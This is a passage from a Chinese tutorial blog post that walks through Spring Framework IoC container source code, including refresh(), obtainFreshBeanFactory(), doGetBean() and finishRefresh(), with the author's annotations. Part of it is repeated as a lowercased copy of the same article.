beanFactory.preInstantiateSingletons();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n关键起作用的在最后一行beanFactory.preInstantiateSingletons();我们进入\n\n这个时候发现又进入了我们的老朋友\n\nDefaultListableBeanFactory这个重要的类\n\n这里里面的关键代码在于通过名字获取bean，也就是getBean(beanName);方法\n\npublic void preInstantiateSingletons() throws BeansException {\n    if (logger.isTraceEnabled()) {\n    \tlogger.trace("Pre-instantiating singletons in " + this);\n    }\n    \n    // Iterate over a copy to allow for init methods which in turn register new bean definitions.\n\t// While this may not be part of the regular factory bootstrap, it does otherwise work fine.\n\tList<String> beanNames = new ArrayList<>(this.beanDefinitionNames);\n \n\t// Trigger initialization of all non-lazy singleton beans...\n\tfor (String beanName : beanNames) {\n\t\tRootBeanDefinition bd = getMergedLocalBeanDefinition(beanName);\n\t\tif (!bd.isAbstract() && bd.isSingleton() && !bd.isLazyInit()) {\n\t\t\tif (isFactoryBean(beanName)) {\n\t\t\t\tObject bean = getBean(FACTORY_BEAN_PREFIX + beanName);\n\t\t\t\tif (bean instanceof FactoryBean) {\n\t\t\t\t\tfinal FactoryBean<?> factory = (FactoryBean<?>) bean;\n\t\t\t\t\tboolean isEagerInit;\n\t\t\t\t\tif (System.getSecurityManager() != null && factory instanceof SmartFactoryBean) {\n\t\t\t\t\t\tisEagerInit = AccessController.doPrivileged((PrivilegedAction<Boolean>)\n\t\t\t\t\t\t\t\t\t\t((SmartFactoryBean<?>) factory)::isEagerInit,\n\t\t\t\t\t\t\t\tgetAccessControlContext());\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tisEagerInit = (factory instanceof SmartFactoryBean &&\n\t\t\t\t\t\t\t\t((SmartFactoryBean<?>) factory).isEagerInit());\n\t\t\t\t\t}\n\t\t\t\t\tif (isEagerInit) {\n\t\t\t\t\t\tgetBean(beanName);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tgetBean(beanName);\n\t\t\t}\n\t\t}\n\t}\n \n\t// Trigger post-initialization callback for all applicable beans...\n\tfor (String beanName : beanNames) {\n\t\tObject singletonInstance = getSingleton(beanName);\n\t\tif (singletonInstance instanceof SmartInitializingSingleton) {\n\t\t\tfinal SmartInitializingSingleton smartSingleton = (SmartInitializingSingleton) singletonInstance;\n\t\t\tif (System.getSecurityManager() != null) {\n\t\t\t\tAccessController.doPrivileged((PrivilegedAction<Object>) () -> {\n\t\t\t\t\tsmartSingleton.afterSingletonsInstantiated();\n\t\t\t\t\treturn null;\n\t\t\t\t}, getAccessControlContext());\n\t\t\t}\n\t\t\telse {\n\t\t\t\tsmartSingleton.afterSingletonsInstantiated();\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n我们进入getBean(beanName);方法\n\npublic Object getBean(String name) throws BeansException {\n\t\treturn doGetBean(name, null, null, false);\n}\n\n\n1\n2\n3\n\n\n发现仅仅是调用了dogetbean这个方法，但是我们在这里看到了do，在spring中do都是干实事的地方，那我们就要知道，创建bean的重点来了。\n\nprotected <T> T doGetBean(final String name, @Nullable final Class<T> requiredType,\n    \t@Nullable final Object[] args, boolean typeCheckOnly) throws BeansException {\n    \t\n    final String beanName = transformedBeanName(name);\n\tObject bean;\n \n\t// Eagerly check singleton cache for manually registered singletons.\n            //这部分是通过getSingleton(beanName)方法去singleton缓存中找bean实例，\n            //应该是拿不到的，因为我们是第一次初始化，缓存中肯定不存在。\n\tObject sharedInstance = getSingleton(beanName);\n\tif (sharedInstance != null && args == null) {\n\t\tif (logger.isTraceEnabled()) {\n\t\t\tif (isSingletonCurrentlyInCreation(beanName)) {\n\t\t\t\tlogger.trace("Returning eagerly cached instance of singleton bean \'" + beanName +\n\t\t\t\t\t\t"\' that is not fully initialized yet - a consequence of a circular reference");\n\t\t\t}\n\t\t\telse {\n\t\t\t\tlogger.trace("Returning cached instance of singleton bean \'" + beanName + "\'");\n\t\t\t}\n\t\t}\n\t\tbean = getObjectForBeanInstance(sharedInstance, name, beanName, null);\n\t}\n \n\telse {\n\t\t// Fail if we\'re already creating this bean instance:\n\t\t// We\'re assumably within a circular reference.\n                    //这段是根据当前的beanfactory获取父一级的beanfactory，然后逐级递归的查找我们需要的bean\n\t\tif (isPrototypeCurrentlyInCreation(beanName)) {\n\t\t\tthrow new BeanCurrentlyInCreationException(beanName);\n\t\t}\n \n\t\t// Check if bean definition exists in this factory.\n\t\tBeanFactory parentBeanFactory = getParentBeanFactory();\n\t\tif (parentBeanFactory != null && !containsBeanDefinition(beanName)) {\n\t\t\t// Not found -> check parent.\n\t\t\tString nameToLookup = originalBeanName(name);\n\t\t\tif (parentBeanFactory instanceof AbstractBeanFactory) {\n\t\t\t\treturn ((AbstractBeanFactory) parentBeanFactory).doGetBean(\n\t\t\t\t\t\tnameToLookup, requiredType, args, typeCheckOnly);\n\t\t\t}\n\t\t\telse if (args != null) {\n\t\t\t\t// Delegation to parent with explicit args.\n\t\t\t\treturn (T) parentBeanFactory.getBean(nameToLookup, args);\n\t\t\t}\n\t\t\telse if (requiredType != null) {\n\t\t\t\t// No args -> delegate to standard getBean method.\n\t\t\t\treturn parentBeanFactory.getBean(nameToLookup, requiredType);\n\t\t\t}\n\t\t\telse {\n\t\t\t\treturn (T) parentBeanFactory.getBean(nameToLookup);\n\t\t\t}\n\t\t}\n        //第三部分先判断并把需要创建的bean打上正在创建标记，\n        //也就是开头的if判断加markBeanAsCreated(beanName)方法\n        //（这样做的目的是在我创建这个bean之前就先打上创建标记，告诉其它来创建的线程，避免了重复创建，那么这个方法内部肯定是同步的）\n\t\tif (!typeCheckOnly) {\n\t\t\tmarkBeanAsCreated(beanName);\n\t\t}\n \n\t\ttry {\n\t\t\tfinal RootBeanDefinition mbd = getMergedLocalBeanDefinition(beanName);\n\t\t\tcheckMergedBeanDefinition(mbd, beanName, args);\n \n\t\t\t// Guarantee initialization of beans that the current bean depends on.\n\t\t\tString[] dependsOn = mbd.getDependsOn();\n\t\t\tif (dependsOn != null) {\n\t\t\t\tfor (String dep : dependsOn) {\n\t\t\t\t\tif (isDependent(beanName, dep)) {\n\t\t\t\t\t\tthrow new BeanCreationException(mbd.getResourceDescription(), beanName,\n\t\t\t\t\t\t\t\t"Circular depends-on relationship between \'" + beanName + "\' and \'" + dep + "\'");\n\t\t\t\t\t}\n\t\t\t\t\tregisterDependentBean(dep, beanName);\n\t\t\t\t\ttry {\n\t\t\t\t\t\tgetBean(dep);\n\t\t\t\t\t}\n\t\t\t\t\tcatch (NoSuchBeanDefinitionException ex) {\n\t\t\t\t\t\tthrow new BeanCreationException(mbd.getResourceDescription(), beanName,\n\t\t\t\t\t\t\t\t"\'" + beanName + "\' depends on missing bean \'" + dep + "\'", ex);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n \n\t\t\t// Create bean instance.\n\t\t\tif (mbd.isSingleton()) {\n\t\t\t\tsharedInstance = getSingleton(beanName, () -> {\n\t\t\t\t\ttry {\n\t\t\t\t\t\treturn createBean(beanName, mbd, args);\n\t\t\t\t\t}\n\t\t\t\t\tcatch (BeansException ex) {\n\t\t\t\t\t\t// Explicitly remove instance from singleton cache: It might have been put there\n\t\t\t\t\t\t// eagerly by the creation process, to allow for circular reference resolution.\n\t\t\t\t\t\t// Also remove any beans that received a temporary reference to the bean.\n\t\t\t\t\t\tdestroySingleton(beanName);\n\t\t\t\t\t\tthrow ex;\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t\tbean = getObjectForBeanInstance(sharedInstance, name, beanName, mbd);\n\t\t\t}\n \n\t\t\telse if (mbd.isPrototype()) {\n\t\t\t\t// It\'s a prototype -> create a new instance.\n\t\t\t\tObject prototypeInstance = null;\n\t\t\t\ttry {\n\t\t\t\t\tbeforePrototypeCreation(beanName);\n\t\t\t\t\tprototypeInstance = createBean(beanName, mbd, args);\n\t\t\t\t}\n\t\t\t\tfinally {\n\t\t\t\t\tafterPrototypeCreation(beanName);\n\t\t\t\t}\n\t\t\t\tbean = getObjectForBeanInstance(prototypeInstance, name, beanName, mbd);\n\t\t\t}\n \n\t\t\telse {\n\t\t\t\tString scopeName = mbd.getScope();\n\t\t\t\tfinal Scope scope = this.scopes.get(scopeName);\n\t\t\t\tif (scope == null) {\n\t\t\t\t\tthrow new IllegalStateException("No Scope registered for scope name \'" + scopeName + "\'");\n\t\t\t\t}\n\t\t\t\ttry {\n\t\t\t\t\tObject scopedInstance = scope.get(beanName, () -> {\n\t\t\t\t\t\tbeforePrototypeCreation(beanName);\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\treturn createBean(beanName, mbd, args);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tfinally {\n\t\t\t\t\t\t\tafterPrototypeCreation(beanName);\n\t\t\t\t\t\t}\n\t\t\t\t\t});\n\t\t\t\t\tbean = getObjectForBeanInstance(scopedInstance, name, beanName, mbd);\n\t\t\t\t}\n\t\t\t\tcatch (IllegalStateException ex) {\n\t\t\t\t\tthrow new BeanCreationException(beanName,\n\t\t\t\t\t\t\t"Scope \'" + scopeName + "\' is not active for the current thread; consider " +\n\t\t\t\t\t\t\t"defining a scoped proxy for this bean if you intend to refer to it from a singleton",\n\t\t\t\t\t\t\tex);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tcatch (BeansException ex) {\n\t\t\tcleanupAfterBeanCreationFailure(beanName);\n\t\t\tthrow ex;\n\t\t}\n\t}\n \n\t// Check if required type matches the type of the actual bean instance.\n\tif (requiredType != null && !requiredType.isInstance(bean)) {\n\t\ttry {\n\t\t\tT convertedBean = getTypeConverter().convertIfNecessary(bean, requiredType);\n\t\t\tif (convertedBean == null) {\n\t\t\t\tthrow new BeanNotOfRequiredTypeException(name, requiredType, bean.getClass());\n\t\t\t}\n\t\t\treturn convertedBean;\n\t\t}\n\t\tcatch (TypeMismatchException ex) {\n\t\t\tif (logger.isTraceEnabled()) {\n\t\t\t\tlogger.trace("Failed to convert bean \'" + name + "\' to required type \'" +\n\t\t\t\t\t\tClassUtils.getQualifiedName(requiredType) + "\'", ex);\n\t\t\t}\n\t\t\tthrow new BeanNotOfRequiredTypeException(name, requiredType, bean.getClass());\n\t\t}\n\t}\n\treturn (T) bean;\n}\n\n\n不知道小伙伴能否在这里体会到反射的思想呢\n\n\n# 5.14 finishRefresh()\n\n最后进行一些收尾工作\n\nprotected void finishRefresh() {\n\t// Clear context-level resource caches (such as ASM metadata from scanning).\n\tclearResourceCaches();\n \n\t// Initialize lifecycle processor for this context.\n\tinitLifecycleProcessor();\n \n\t// Propagate refresh to lifecycle processor first.\n\tgetLifecycleProcessor().onRefresh();\n \n\t// Publish the final event.\n\tpublishEvent(new ContextRefreshedEvent(this));\n \n\t// Participate in LiveBeansView MBean, if active.\n\tLiveBeansView.registerApplicationContext(this);\n}\n\n\n\n# 总结\n\n\n# 源码分析中比较重要的类有\n\nApplicationContet（主要的容器，串联流程）\n\nEnvironment（可以判断环境的有效性）\n\nBeanPostProcessor（用于bean实例化前后的扩展）\n\nBeanFactory（最顶层的一个接口）\n\nFactoryBean（也是用来更好的扩展，他也就有三个方法）\n\nBeanFactoryPostPorcessor（用来工厂后来的扩展）\n\nBeanDefinitionReader（读取前面的一些信息）\n\nclassPathXmlApplicationContext（读取总的配置文件）\n\nContextLoaderListener与它的父类ContextLoader（spring的入口）\n\n\n# 参考\n\n1.https://blog.csdn.net/spring_live_in/article/details/101059038\n\n2.https://blog.csdn.net/sinat_38259539/article/details/71799078?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4\n\n3.https://liteyu.blog.csdn.net/article/details/105754312\n\n4.https://blog.csdn.net/v123411739/article/details/87741251',normalizedContent:'ioc的流程分析，深入理解具体的接口和类，内容包括applicationcontext，beandefinitionreader，beanfactory,beanfactorypostprocessor,factorybean,beanpostprocessor,environment等。\n\n\n\n * 一 前言\n * 二 反射基础\n * 三 设计模式\n * 四 ioc流程分析\n   * 4.1 ioc流程图\n   * 4.2 ioc流程图讲解\n * 五 核心类分析\n   * 5.0 contextloaderlistener与它的父类contextloader\n   * 5.1 classpathxmlapplicationcontext\n   * 5.2 abstractapplicationcontext\n   * 5.3 preparerefresh()\n   * 5.4 核心方法之一 obtainfreshbeanfactory()\n   * 5.5 preparebeanfactory()\n   * 5.6 postprocessbeanfactory()\n   * 5.7 核心方法之一 invokebeanfactorypostprocessors()\n   * 5.8 核心方法之一 registerbeanpostprocessors()\n   * 5.9 initmessagesource()\n   * 5.10 initapplicationeventmulticaster()\n   * 5.11 onrefresh()\n   * 5.12 registerlisteners()\n   * 5.13 核心方法之一 finishbeanfactoryinitialization(beanfactory)\n   * 5.14 finishrefresh()\n * 总结\n   * 源码分析中比较重要的类有\n * 参考\n\n\n\n\n# 一 前言\n\n本文章的主要内容：\n\n（1）反射，反射是框架设计的灵魂，必须会的。\n\n（2）设计模式，框架里面体现了很多设计模式，比如单例模式，观察者模式，工厂模式等\n\n（3）ioc的流程分析，spring源码之所以难，是因为里面的接口和类真的很多，可以将其中的核心接口和类了解清楚流程，并深入看一下其中的内容。想全部的掌握spring源码很难，并且没有那么大的必要，它已经封装好了，封装就是为了让你使用的。所以，我们只要把它的核心源码弄清楚就可以了。\n\n（4）深入理解具体的接口和类，内容包括applicationcontext，beandefinitionreader，beanfactory,beanfactorypostprocessor,factorybean,beanpostprocessor,environment等。\n\n\n# 二 反射基础\n\n反射基础的话我为大家找了一篇清晰易懂的文章，这不是本文章的重点，请参考：\n\n传送门\n\n\n# 三 设计模式\n\n设计模式的话，重点看其中的单例，观察者，工厂即可，参考：\n\n传送门\n\n\n# 四 ioc流程分析\n\n\n# 4.1 ioc流程图\n\n\n\n百度找的马士兵教育的流程图，侵删。\n\n\n# 4.2 ioc流程图讲解\n\n（1）从xml，配置类，annotation中读取响应的配置信息。\n\n（2）如果想要对配置的信息进行人为的修改，可以采用beanfactoryprocessor\n\n（3）然后创建对应的beanfactory，如果这个时候扩展的话，就可以利用factorybean，它是用来扩展的。\n\n（4）实例化之前还可以利用beanpostprocessor进行扩展\n\n（5）利用反射进行实例化的过程。\n\n（6）如果想要在容器的不同阶段做不同的事情，可以利用观察者模式，也就是监听器进行处理。\n\n（7）其中的environment也是一个重要的类，获取一些环境的属性。\n\n先在脑海中有这样一张大概的流程图，然后再去看相应的源码部分抠细节。\n\n\n# 五 核心类分析\n\n以下类的内容都是双击shift查找得到的源码，由于源码过长，我真粘贴其中重要的部分进行分析。\n\n\n# 5.0 contextloaderlistener与它的父类contextloader\n\n容器构建启动入口\n\n容器构建启动的入口有多种多样，这边以常用的 web.xml 配置的方式来说。\n\n首先，我们会在 web.xml 中配置 contextloaderlistener 监听器，当 tomcat 启动时，会触发 contextloaderlistener 的 contextinitialized 方法，从而开始 ioc 的构建流程。\n\n另一个常用的参数是 contextconfiglocation，用于指定 spring 配置文件的路径。\n\n<?xml version="1.0" encoding="utf-8"?>\n<web-app version="2.5" xmlns="java ee: xml schemas for java ee deployment descriptors" \n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="java ee: xml schemas for java ee deployment descriptors\n         http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd">\n    <display-name>open-joonwhee-service war</display-name>\n \n    <context-param>\n        <param-name>contextconfiglocation</param-name>\n        <param-value>\n            classpath*:config/spring/appcontext-*.xml\n        </param-value>\n    </context-param>\n \n    <listener>\n        <listener-class>org.springframework.web.context.contextloaderlistener</listener-class>\n    </listener>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\ncontextloaderlistener 是 spring 的入口\n\n并且的它的父类contextloader存在这样一个方法，可以实现扩功能先简单知道一下\n\nrefresh（）方法是核心，并且在它之前也需要做一些准备\n\n请参考：https://blog.csdn.net/v123411739/article/details/86555733\n\nprotected void customizecontext(servletcontext sc, configurablewebapplicationcontext wac) {\n\tlist<class<applicationcontextinitializer<configurableapplicationcontext>>> initializerclasses =\n\t\t\tdeterminecontextinitializerclasses(sc);\n \n\tfor (class<applicationcontextinitializer<configurableapplicationcontext>> initializerclass : initializerclasses) {\n\t\tclass<?> initializercontextclass =\n\t\t\t\tgenerictyperesolver.resolvetypeargument(initializerclass, applicationcontextinitializer.class);\n\t\tif (initializercontextclass != null && !initializercontextclass.isinstance(wac)) {\n\t\t\tthrow new applicationcontextexception(string.format(\n\t\t\t\t\t"could not apply context initializer [%s] since its generic parameter [%s] " +\n\t\t\t\t\t"is not assignable from the type of application context used by this " +\n\t\t\t\t\t"context loader: [%s]", initializerclass.getname(), initializercontextclass.getname(),\n\t\t\t\t\twac.getclass().getname()));\n\t\t}\n\t\tthis.contextinitializers.add(beanutils.instantiateclass(initializerclass));\n\t}\n \n\tannotationawareordercomparator.sort(this.contextinitializers);\n\tfor (applicationcontextinitializer<configurableapplicationcontext> initializer : this.contextinitializers) {\n\t\tinitializer.initialize(wac);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 5.1 classpathxmlapplicationcontext\n\n从这个类的注释我提取出了这样两句话\n\ntaking the context definition files from the class path\n\nloading the definitions from the given xml files\n\n意思就是从class path下提取全局的配置文件，加载给定的xml文件，也就知道了这个类大概就是加载一些配置的。\n\n然后发现其中有两个构造方法中有refresh方法，那么这个refresh方法是干什么的呢？其实这是一个非常重要的方法，它将整个ioc的过程进行了一个串联，最关键的部分。\n\n\n\n\n# 5.2 abstractapplicationcontext\n\n上面提到了refresh方法，右键这个方法，goto，实现方法，就会到达这个重要的类，这是一个核心类，将所有的ioc过程进行了一个串联，那下面我们就对这个类的refresh方法进行一个详细的分析，依照四中给的图。然后我们将对其中的每一个方法进行具体的源码分析，深入每个方法之中。\n\n其中最重要的几个方法：\n\nconfigurablelistablebeanfactory beanfactory = obtainfreshbeanfactory();\n\n\n1\n\n\ninvokebeanfactorypostprocessors(beanfactory);\n\n\n1\n\n\nregisterbeanpostprocessors(beanfactory);\n\n\n1\n\n\nfinishbeanfactoryinitialization(beanfactory);\n\n\n1\n\n\n然后我们将在后面的小结依次讲解各个方法。\n\npublic void refresh() throws beansexception, illegalstateexception {\n\tsynchronized (this.startupshutdownmonitor) {\n        // prepare this context for refreshing.\n        preparerefresh();\n        // tell the subclass to refresh the internal bean factory.\n\t\tconfigurablelistablebeanfactory beanfactory = obtainfreshbeanfactory();\n \n\t\t// prepare the bean factory for use in this context.\n\t\tpreparebeanfactory(beanfactory);\n \n\t\ttry {\n\t\t\t// allows post-processing of the bean factory in context subclasses.\n\t\t\tpostprocessbeanfactory(beanfactory);\n \n\t\t\t// invoke factory processors registered as beans in the context.\n\t\t\tinvokebeanfactorypostprocessors(beanfactory);\n \n\t\t\t// register bean processors that intercept bean creation.\n\t\t\tregisterbeanpostprocessors(beanfactory);\n \n\t\t\t// initialize message source for this context.\n\t\t\tinitmessagesource();\n \n\t\t\t// initialize event multicaster for this context.\n\t\t\tinitapplicationeventmulticaster();\n \n\t\t\t// initialize other special beans in specific context subclasses.\n\t\t\tonrefresh();\n \n\t\t\t// check for listener beans and register them.\n\t\t\tregisterlisteners();\n \n\t\t\t// instantiate all remaining (non-lazy-init) singletons.\n\t\t\tfinishbeanfactoryinitialization(beanfactory);\n \n\t\t\t// last step: publish corresponding event.\n\t\t\tfinishrefresh();\n\t\t}\n \n\t\tcatch (beansexception ex) {\n\t\t\tif (logger.iswarnenabled()) {\n\t\t\t\tlogger.warn("exception encountered during context initialization - " +\n\t\t\t\t\t\t"cancelling refresh attempt: " + ex);\n\t\t\t}\n \n\t\t\t// destroy already created singletons to avoid dangling resources.\n\t\t\tdestroybeans();\n \n\t\t\t// reset \'active\' flag.\n\t\t\tcancelrefresh(ex);\n \n\t\t\t// propagate exception to caller.\n\t\t\tthrow ex;\n\t\t}\n \n\t\tfinally {\n\t\t\t// reset common introspection caches in spring\'s core, since we\n\t\t\t// might not ever need metadata for singleton beans anymore...\n\t\t\tresetcommoncaches();\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n\n# 5.3 preparerefresh()\n\n这个方法还是比较简单的，也就是做了一个时间戳，日志，环境校验，初始化监听器容器，初始化applicationevents容器\n\nprotected void preparerefresh() {\n\t// switch to active.\n        //前面这些就是记录以下启动的时间\n\tthis.startupdate = system.currenttimemillis();\n\tthis.closed.set(false);\n\tthis.active.set(true);\n\t\t//进行一些日志的设置\n\tif (logger.isdebugenabled()) {\n\t\tif (logger.istraceenabled()) {\n            logger.trace("refreshing " + this);\n        }\n        else {\n            logger.debug("refreshing " + getdisplayname());\n        }\n\t}\n\t// initialize any placeholder property sources in the context environment.\n\t\t//这是一个空的方法，目前spring没有对其做任何事\n\tinitpropertysources();\n \n\t// validate that all properties marked as required are resolvable:\n\t// see configurablepropertyresolver#setrequiredproperties\n            //验证配置文件的有效性\n            //environment这个类主要用于当前环境的判断，判断有效性之类的\n            //getenvironment这个方法的逻辑你可以试着点进去，发现就是\n            //有的话直接返回，没有的话就创建一个\n\tgetenvironment().validaterequiredproperties();\n \n\t// store pre-refresh applicationlisteners...\n            //在最开始的图中我们也提到了监听器，这里就是监听器\n            //准备的时候创建一个监听器的容器\n\tif (this.earlyapplicationlisteners == null) {\n\t\tthis.earlyapplicationlisteners = new linkedhashset<>(this.applicationlisteners);\n\t}\n\telse {\n\t\t// reset local application listeners to pre-refresh state.\n\t\tthis.applicationlisteners.clear();\n\t\tthis.applicationlisteners.addall(this.earlyapplicationlisteners);\n\t}\n \n\t// allow for the collection of early applicationevents,\n\t// to be published once the multicaster is available...\n            //在multicaster设置之前发布的applicationevents\n\tthis.earlyapplicationevents = new linkedhashset<>();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# 5.4 核心方法之一 obtainfreshbeanfactory()\n\n这个地方方法走的比较多，解释我基本都会写在注释当中\n\nprotected configurablelistablebeanfactory obtainfreshbeanfactory() {\n\t\t//一共有两步\n                //关闭旧的beanfactory 创建新的beanfactory 并注册\n                refreshbeanfactory();\n                //返回创造的对象\n                之后我们将具体来看一下这两个方法\n\t\treturn getbeanfactory();\n\t}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n右键， refreshbeanfactory()，goto，来到相应的方法，这个方法在\n\nabstractrefreshableapplicationcontext类当中\n\nprotected final void refreshbeanfactory() throws beansexception {\n    //这一步很简单，如果有的话，就关闭之前的，重新创建\n    if (hasbeanfactory()) {\n        destroybeans();\n        closebeanfactory();\n    }\n    try {\n        //这一步又要详细分析这四个方法了\n        //这个方法里面就一句话\n        //new defaultlistablebeanfactory(getinternalparentbeanfactory());\n        //也就是创建一个beanfactory这个类，初步形成\n        defaultlistablebeanfactory beanfactory = createbeanfactory();\n\n        //设置序列化id\n        beanfactory.setserializationid(getid());\n        //这个地方有点意思，需要讲一下，在下面看一下它的方法\n        //customize是定制的意思，所以英文对程序员真的很有用\n        customizebeanfactory(beanfactory);\n        //这是创建的时候最核心的方法，一层一层深入看一下吧\n        loadbeandefinitions(beanfactory);\n        //设置到这个类的属性当中，用于返回对象方法时的使用\n        synchronized (this.beanfactorymonitor) {\n            this.beanfactory = beanfactory;\n        }\n    }\n    catch (ioexception ex) {\n        throw new applicationcontextexception("i/o error parsing bean definition source for " + getdisplayname(), ex);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\ncustomizebeanfactory方法，定义覆盖以及循环依赖的问题\n\nprotected void customizebeanfactory(defaultlistablebeanfactory beanfactory) {\n\n\tif (this.allowbeandefinitionoverriding != null) {\n\t\t//是否允许bean定义的覆盖\n\t\t// beandefinition 的覆盖问题大家也许会碰到，\n\t\t// 就是在配置文件中定义 bean 时使用了相同的 id 或 name\n\t\t// ，默认情况下，allowbeandefinitionoverriding 属性为 null，\n\t\t// 如果在同一配置文件中重复了，会抛错，但是如果不是同一配置文件中，会发生覆盖。\n\t\tbeanfactory.setallowbeandefinitionoverriding(this.allowbeandefinitionoverriding);\n\t}\n\tif (this.allowcircularreferences != null) {\n\t\t//是否允许bean 间的循环依赖\n\t\t// a 依赖 b，而 b 依赖 a。或 a 依赖 b，b 依赖 c，而 c 依赖 a\n\t\t// 默认情况下，spring 允许循环依赖，当然如果你在 a 的构造方法中依赖 b，在 b 的构造方法中依赖 a 是不行的。\n\t\tbeanfactory.setallowcircularreferences(this.allowcircularreferences);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n核心方法：loadbeandefinitions(beanfactory)，这里就和我们图中的beandefinitionreader联系在一起了，有内味儿了\n\nprotected void loadbeandefinitions(defaultlistablebeanfactory beanfactory) throws beansexception, ioexception {\n\t// create a new xmlbeandefinitionreader for the given beanfactory.\n\t// 创建同一个xmlbeandefinitionreader 见名知意 xml的beandefine读取器转换器 也就是将xml文件转化为beandefinition\n\txmlbeandefinitionreader beandefinitionreader = new xmlbeandefinitionreader(beanfactory);\n\t// configure the bean definition reader with this context\'s\n\t// resource loading environment.\n\t// 设置当前环境\n\tbeandefinitionreader.setenvironment(this.getenvironment());\n\t//这里的setresourceloader赋值 我们在refresh方法的时候就已经给this赋值\n\t//且看\n\t// \t\tsuper(parent);\n\t//\t\t// 将配置文件路径设置给abstractrefreshableconfigapplicationcontext 的        configlocations的属性\n\t//\t\tsetconfiglocations(configlocations); //这个方法就将配置路径赋值了\n\t//\t\t// 由上面的参数传进refresh为true 下面我们就进入refresh方法 spring初始化全程\n\t//\t\tif (refresh) {\n\t//\t\t\trefresh();\n\t//\t\t}\n\tbeandefinitionreader.setresourceloader(this);\n\tbeandefinitionreader.setentityresolver(new resourceentityresolver(this));\n\t// allow a subclass to provide custom initialization of the reader,\n\t// then proceed with actually loading the bean definitions.\n\tinitbeandefinitionreader(beandefinitionreader);\n\t//下面方法是核心\n\tloadbeandefinitions(beandefinitionreader);\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n继续进入loadbeandefinitions(beandefinitionreader);方法\n\n点进reader.loadbeandefinitions(configlocations);方法\n\n点进loadbeandefinitions方法\n\n点进doloadbeandefinitions方法，在spring中带do的都是干实事的\n\n \nprotected int doloadbeandefinitions(inputsource inputsource, resource resource)\n    throws beandefinitionstoreexception {\n    try {\n        //这里我们将资源文件转化为document对象\n        document doc = doloaddocument(inputsource, resource);\n        //开始注册对应的beandefinition 我们继续进去\n        int count = registerbeandefinitions(doc, resource);\n        if (logger.isdebugenabled()) {\n            logger.debug("loaded " + count + " bean definitions from " + resource);\n        }\n        return count;\n    }\n    catch (beandefinitionstoreexception ex) {\n        throw ex；\n    }\n    catch (saxparseexception ex) {\n        throw new xmlbeandefinitionstoreexception(resource.getdescription(),\n                                                  "line " + ex.getlinenumber() + " in xml document from " + resource + " is invalid", ex);\n    }\n    catch (saxexception ex) {\n        throw new xmlbeandefinitionstoreexception(resource.getdescription(),\n                                                  "xml document from " + resource + " is invalid", ex);\n    }\n    catch (parserconfigurationexception ex) {\n        throw new beandefinitionstoreexception(resource.getdescription(),\n                                               "parser configuration exception parsing xml from " + resource, ex);\n    }\n    catch (ioexception ex) {\n        throw new beandefinitionstoreexception(resource.getdescription(),\n                                               "ioexception parsing xml document from " + resource, ex);\n    }\n    catch (throwable ex) {\n        throw new beandefinitionstoreexception(resource.getdescription(),\n                                               "unexpected exception parsing xml document from " + resource, ex);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n直接进入defaultbeandefinitiondocumentreader 下面的doregisterbeandefinitions\n\nprotected void doregisterbeandefinitions(element root) {\n\t\t// any nested <beans> elements will cause recursion in this method. in\n\t\t// rder to propagate and preserve <beans> default-* attributes correctly,\n\t\t// keep track of the current (parent) delegate, which may be null. create\n\t\t// the new (child) delegate with a reference to the parent for fallback purposes,\n\t\t// then ultimately reset this.delegate back to its original (parent) reference.\n\t\t// this behavior emulates a stack of delegates without actually necessitating one.\n\t\tbeandefinitionparserdelegate parent = this.delegate;\n\t\tthis.delegate = createdelegate(getreadercontext(), root, parent);\nif (this.delegate.isdefaultnamespace(root)) 